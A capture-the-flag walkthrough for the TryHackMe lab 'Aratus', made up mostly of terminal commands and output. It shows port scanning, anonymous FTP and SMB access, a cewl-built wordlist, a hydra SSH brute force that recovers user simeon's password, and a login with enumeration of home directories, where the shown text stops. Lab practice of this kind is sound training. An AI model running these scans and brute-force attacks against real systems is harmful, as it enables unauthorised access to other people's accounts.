# Aratus — Writeup

## Overview
### Aratus — Writeup
### Aratus — Writeup
----
Do you like reading? Do you like to go through tons of text? Aratus has what you need!
----
![](https://tryhackme-images.s3.amazonaws.com/room-icons/d647822a9c25da0f0489275857ea0cff.jpeg)
![](https://upload.wikimedia.org/wikipedia/commons/1/11/Hellenic_Parliament_from_high_above.jpg)

## Flags / Answers
- Good luck!
- Answer the questions below
```text
- ┌──(witty㉿kali)-[~]
└─$ rustscan -a 10.10.132.119 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.132.119:22
Open 10.10.132.119:21
Open 10.10.132.119:80
Open 10.10.132.119:139
Open 10.10.132.119:443
Open 10.10.132.119:445
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org )
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Initiating Parallel DNS resolution of 1 host.
Completed Parallel DNS resolution of 1 host.
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan
Scanning 10.10.132.119 [6 ports]
Discovered open port 139/tcp on 10.10.132.119
Discovered open port 21/tcp on 10.10.132.119
Discovered open port 443/tcp on 10.10.132.119
Discovered open port 22/tcp on 10.10.132.119
Discovered open port 445/tcp on 10.10.132.119
Discovered open port 80/tcp on 10.10.132.119
Completed Connect Scan (6 total ports)
Initiating Service scan
Scanning 6 services on 10.10.132.119
Completed Service scan (6 services on 1 host)
NSE: Script scanning 10.10.132.119.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
NSE: [ftp-bounce 10.10.132.119:21] PORT response: 500 Illegal PORT command.
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Nmap scan report for 10.10.132.119
Host is up, received user-set (0.18s latency).

PORT    STATE SERVICE     REASON  VERSION
21/tcp  open  ftp         syn-ack vsftpd 3.0.2
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.19.103
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 0        0               6 Jun 09  2021 pub
22/tcp  open  ssh         syn-ack OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 092362a2186283690440623297ff3ccd (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDakZyfnq0JzwuM1SD3YZ4zyizbtc9AOvhk2qCaTwJHEKyyqIjBaElNv4LpSdtV7y/C6vwUfPS34IO/mAmNtAFquBDjIuoKdw9TjjPrVBVjzFxD/9tDSe+cu6ELPHMyWOQFAYtg1CV1TQlm3p6WIID2IfYBffpfSz54wRhkTJd/+9wgYdOwfe+VRuzV8EgKq4D2cbUTjYjl0dv2f2Th8WtiRksEeaqI1fvPvk6RwyiLdV5mSD/h8HCTZgYVvrjPShW9XPE/wws82/wmVFtOPfY7WAMhtx5kiPB11H+tZSAV/xpEjXQQ9V3Pi6o4vZdUvYSbNuiN4HI4gAWnp/uqPsoR
|   256 33663536b0680632c18af601bc4338ce (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEMyTtxVAKcLy5u87ws+h8WY+GHWg8IZI4c11KX7bOSt85IgCxox7YzOCZbUA56QOlryozIFyhzcwOeCKWtzEsA=
|   256 1498e3847055e6600cc20977f8b7a61c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOKY0jLSRkYg0+fTDrwGOaGW442T5k1qBt7l8iAkcuCk
80/tcp  open  http        syn-ack Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips)
|_http-title: Apache HTTP Server Test Page powered by CentOS
| http-methods: 
|   Supported Methods: GET HEAD POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips
139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  ssl/http    syn-ack Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| ssl-cert: Subject: commonName=aratus/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--/emailAddress=root@aratus/localityName=SomeCity/organizationalUnitName=SomeOrganizationalUnit
| Issuer: commonName=aratus/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--/emailAddress=root@aratus/localityName=SomeCity/organizationalUnitName=SomeOrganizationalUnit
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| MD5:   56ccc5936bdc9168bc7da4b77d3f004e
| SHA-1: 7678b819d2c65dc9515e09eb1e18d772aec7a686
| -----BEGIN CERTIFICATE-----
| MIID0jCCArqgAwIBAgICcOEwDQYJKoZIhvcNAQELBQAwgZ0xCzAJBgNVBAYTAi0t
| MRIwEAYDVQQIDAlTb21lU3RhdGUxETAPBgNVBAcMCFNvbWVDaXR5MRkwFwYDVQQK
| DBBTb21lT3JnYW5pemF0aW9uMR8wHQYDVQQLDBZTb21lT3JnYW5pemF0aW9uYWxV
| bml0MQ8wDQYDVQQDDAZhcmF0dXMxGjAYBgkqhkiG9w0BCQEWC3Jvb3RAYXJhdHVz
| MB4XDTIxMTEyMzEyMjgyNloXDTIyMTEyMzEyMjgyNlowgZ0xCzAJBgNVBAYTAi0t
| MRIwEAYDVQQIDAlTb21lU3RhdGUxETAPBgNVBAcMCFNvbWVDaXR5MRkwFwYDVQQK
| DBBTb21lT3JnYW5pemF0aW9uMR8wHQYDVQQLDBZTb21lT3JnYW5pemF0aW9uYWxV
| bml0MQ8wDQYDVQQDDAZhcmF0dXMxGjAYBgkqhkiG9w0BCQEWC3Jvb3RAYXJhdHVz
| MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAu89vYhIysl0/L4Uy4SK1
| sK3SB/BODuskfXTs3zKKkHhWNQFUru8BRabq5H6JIPdHjel29sE+EXk90Z2VpEHw
| xexm2LHx188DQGE0Sz9nbY4hswQVoVQdTqNbrhPFhUdejpv77tMX/WrUY7APihNY
| jVrLGlATQXaUHIWjUZfQXZr62qE9GJhUoiCGM+5wmHbUYSJWMTTbLYW5quFAWoks
| P7TWjB72dJRlX9mG8IULwzE0Hh1NV3FwPLZ+0GrRrUttCUidu/Be01Zy3cukp8T7
| aS+CtdotN3z7oZ5mOFYr3KWfWZd5jsJVu/gVEBWySG7n61on5IYZJ1XquUv/xE9N
| +wIDAQABoxowGDAJBgNVHRMEAjAAMAsGA1UdDwQEAwIF4DANBgkqhkiG9w0BAQsF
| AAOCAQEAOE+updU9n5lole1A8a2SC6JM1qQDzxpyxBYQH2SQuWyIEviLXztm8XtD
| BodOdWEiVRvuZES3fevXEw6BtfDeDffvyMR5lfGj59V+4RGv4/wBq92oO2Vw8zbZ
| IMZH47zOsI1nNBGw+vYBqNpMnc/NbiRkkXtK0xnM52u6E57HuhsB4n+V28JVTMvx
| njFCQi2Lc1SqJfUMXbPq8Yz+WkJSNyUVXVgZdRjV7ci0mBdbBJMIs/YBCTgfoVc4
| 1teGrFDOz6RVKWyaYLrMw0ZiwCcT5GsvHkFnyWLYM0RZp79tLkuRulAkE0G73n8w
| bUBX774ppOtyCLfxPb27RGf3zFYNww==
|_-----END CERTIFICATE-----
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips
|_http-title: 400 Bad Request
|_ssl-date: TLS randomness does not represent time
445/tcp open  netbios-ssn syn-ack Samba smbd 4.10.16 (workgroup: WORKGROUP)
Service Info: Host: ARATUS; OS: Unix

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 59186/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 64813/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 28118/udp): CLEAN (Failed to receive data)
|   Check 4 (port 46968/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2023-07-23T02:06:53
|_  start_date: N/A
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.10.16)
|   Computer name: aratus
|   NetBIOS computer name: ARATUS\x00
|   Domain name: \x00
|   FQDN: aratus
|_  System time: 2023-07-23T04:06:50+02:00
|_clock-skew: mean: -39m58s, deviation: 1h09m16s, median: 0s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.08 seconds

┌──(witty㉿kali)-[~]
└─$ ftp 10.10.132.119                       
Connected to 10.10.132.119.
220 (vsFTPd 3.0.2)
Name (10.10.132.119:witty): ftp
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||15785|).
150 Here comes the directory listing.
drwxr-xr-x    2 0        0               6 Jun 09  2021 pub
226 Directory send OK.
ftp> ls -lah
229 Entering Extended Passive Mode (|||22622|).

┌──(root㉿kali)-[/home/witty/Downloads]
└─# dirsearch -u http://10.10.132.119/ -i200,301,302,401

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /root/.dirsearch/reports/10.10.132.119/-_23-07-22_22-33-01.txt

Error Log: /root/.dirsearch/logs/errors-23-07-22_22-33-01.log

Target: http://10.10.132.119/

[22:33:01] Starting: 

┌──(witty㉿kali)-[~]
└─$ smbclient -N -L 10.10.132.119                      
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	temporary share Disk      
	IPC$            IPC       IPC Service (Samba 4.10.16)
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------

┌──(witty㉿kali)-[~]
└─$ smbclient -N "\\\\10.10.132.119\\temporary share"
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls -lah
NT_STATUS_NO_SUCH_FILE listing \-lah
smb: \> ls
  .                                   D        0  Mon Jan 10 08:06:44 2022
  ..                                  D        0  Tue Nov 23 11:24:05 2021
  .bash_logout                        H       18  Tue Mar 31 22:17:30 2020
  .bash_profile                       H      193  Tue Mar 31 22:17:30 2020
  .bashrc                             H      231  Tue Mar 31 22:17:30 2020
  .bash_history                       H        0  Sat Jul 22 22:02:20 2023
  chapter1                            D        0  Tue Nov 23 05:07:47 2021
  chapter2                            D        0  Tue Nov 23 05:08:11 2021
  chapter3                            D        0  Tue Nov 23 05:08:18 2021
  chapter4                            D        0  Tue Nov 23 05:08:25 2021
  chapter5                            D        0  Tue Nov 23 05:08:33 2021
  chapter6                            D        0  Tue Nov 23 05:12:24 2021
  chapter7                            D        0  Tue Nov 23 06:14:27 2021
  chapter8                            D        0  Tue Nov 23 05:12:45 2021
  chapter9                            D        0  Tue Nov 23 05:12:53 2021
  .ssh                               DH        0  Mon Jan 10 08:05:34 2022
  .viminfo                            H        0  Sat Jul 22 22:02:20 2023
  message-to-simeon.txt               N      251  Mon Jan 10 08:06:44 2022

		37726212 blocks of size 1024. 35597080 blocks available

Simeon,

Stop messing with your home directory, you are moving files and directories insecurely!
Just make a folder in /opt for your book project...

Also you password is insecure, could you please change it? It is all over the place now!

- Theodore

smb: \> cd .ssh
smb: \.ssh\> ls
NT_STATUS_ACCESS_DENIED listing \.ssh\*

┌──(witty㉿kali)-[~]
└─$ smbclient -N "\\\\10.10.132.119\\temporary share"
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls -lah
NT_STATUS_NO_SUCH_FILE listing \-lah
smb: \> ls
  .                                   D        0  Mon Jan 10 08:06:44 2022
  ..                                  D        0  Tue Nov 23 11:24:05 2021
  .bash_logout                        H       18  Tue Mar 31 22:17:30 2020
  .bash_profile                       H      193  Tue Mar 31 22:17:30 2020
  .bashrc                             H      231  Tue Mar 31 22:17:30 2020
  .bash_history                       H        0  Sat Jul 22 22:02:20 2023
  chapter1                            D        0  Tue Nov 23 05:07:47 2021
  chapter2                            D        0  Tue Nov 23 05:08:11 2021
  chapter3                            D        0  Tue Nov 23 05:08:18 2021
  chapter4                            D        0  Tue Nov 23 05:08:25 2021
  chapter5                            D        0  Tue Nov 23 05:08:33 2021
  chapter6                            D        0  Tue Nov 23 05:12:24 2021
  chapter7                            D        0  Tue Nov 23 06:14:27 2021
  chapter8                            D        0  Tue Nov 23 05:12:45 2021
  chapter9                            D        0  Tue Nov 23 05:12:53 2021
  .ssh                               DH        0  Mon Jan 10 08:05:34 2022
  .viminfo                            H        0  Sat Jul 22 22:02:20 2023
  message-to-simeon.txt               N      251  Mon Jan 10 08:06:44 2022

		37726212 blocks of size 1024. 35597080 blocks available
smb: \> more message-to-simeon.txt
getting file \message-to-simeon.txt of size 251 as /tmp/smbmore.c5Y51I (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \> more message-to-simeon.txt
getting file \message-to-simeon.txt of size 251 as /tmp/smbmore.KOc9fm (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \> more .viminfo
NT_STATUS_ACCESS_DENIED opening remote file \.viminfo
smb: \> cd .ssh
smb: \.ssh\> ls
NT_STATUS_ACCESS_DENIED listing \.ssh\*
smb: \.ssh\> more .bash_history
NT_STATUS_ACCESS_DENIED opening remote file \.ssh\.bash_history
smb: \.ssh\> cd chapter1
cd \.ssh\chapter1\: NT_STATUS_ACCESS_DENIED
smb: \.ssh\> cd chapter2
cd \.ssh\chapter2\: NT_STATUS_ACCESS_DENIED
smb: \.ssh\> exit

┌──(witty㉿kali)-[~]
└─$ smbclient -N "\\\\10.10.132.119\\temporary share"
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> mget *
Get file .bash_logout? 
Get file .bash_profile? 
Get file .bashrc? 
Get file .bash_history? 
Get file .viminfo? 
Get file message-to-simeon.txt? 

http://10.10.132.119/simeon/

┌──(witty㉿kali)-[~]
└─$ cewl http://10.10.132.119/simeon/ > wordlist_simeon
                                                                                        
┌──(witty㉿kali)-[~]
└─$ more wordlist_simeon             
CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
orci
quam
sit
amet
tellus
non
pulvinar

┌──(witty㉿kali)-[~]
└─$ hydra -l simeon -P wordlist_simeon ssh://10.10.132.119 -t 64
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 207 login tries (l:1/p:207), ~4 tries per task
[DATA] attacking ssh://10.10.132.119:22/
[22][ssh] host: 10.10.132.119   login: simeon   password: scelerisque
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 23 final worker threads did not complete until end.
[ERROR] 23 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished

┌──(witty㉿kali)-[~]
└─$ ssh simeon@10.10.132.119                         
The authenticity of host '10.10.132.119 (10.10.132.119)' can't be established.
ED25519 key fingerprint is SHA256:rRttffFIyZasFZ3kH1UCuXbqoQKD5nKQWgtEudn7nys.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:92: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.132.119' (ED25519) to the list of known hosts.
simeon@10.10.132.119's password: 
Last failed login: Sun Jul 23 04:45:24 CEST 2023 from ip-10-8-19-103.eu-west-1.compute.internal on ssh:notty
There were 40 failed login attempts since the last successful login.
Last login: Mon Jan 10 14:07:52 2022 from 172.16.42.100
[simeon@aratus ~]$ id
uid=1003(simeon) gid=1003(simeon) groups=1003(simeon) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[simeon@aratus ~]$ ls
chapter1  chapter3  chapter5  chapter7  chapter9
chapter2  chapter4  chapter6  chapter8  message-to-simeon.txt
[simeon@aratus ~]$ cd /home
[simeon@aratus home]$ ls
automation  simeon  theodore
[simeon@aratus home]$ cd simeon/
[simeon@aratus ~]$ ls
chapter1  chapter3  chapter5  chapter7  chapter9
chapter2  chapter4  chapter6  chapter8  message-to-simeon.txt
[simeon@aratus ~]$ ls -lah
total 20K
drwxr-xr-x. 12 simeon   simeon 4.0K Jan 10  2022 .
drwxr-xr-x.  5 root     root     54 Nov 23  2021 ..
lrwxrwxrwx.  1 simeon   simeon    9 Nov 23  2021 .bash_history -> /dev/null
-rw-r--r--.  1 simeon   simeon   18 Apr  1  2020 .bash_logout
-rw-r--r--.  1 simeon   simeon  193 Apr  1  2020 .bash_profile
-rw-r--r--.  1 simeon   simeon  231 Apr  1  2020 .bashrc
drwxr-xr-x.  5 simeon   simeon   66 Nov 23  2021 chapter1
drwxr-xr-x.  7 simeon   simeon  106 Nov 23  2021 chapter2
drwxr-xr-x.  6 simeon   simeon   86 Nov 23  2021 chapter3
drwxr-xr-x.  6 simeon   simeon   86 Nov 23  2021 chapter4
drwxr-xr-x.  4 simeon   simeon   46 Nov 23  2021 chapter5
drwxr-xr-x.  5 simeon   simeon   66 Nov 23  2021 chapter6
drwxr-xr-x.  4 simeon   simeon   46 Nov 23  2021 chapter7
drwxr-xr-x.  6 simeon   simeon   86 Nov 23  2021 chapter8
drwxr-xr-x.  7 simeon   simeon  106 Nov 23  2021 chapter9
-rw-r--r--.  1 theodore root    251 Jan 10  2022 message-to-simeon.txt
drwx------.  2 simeon   simeon   29 Jan 10  2022 .ssh
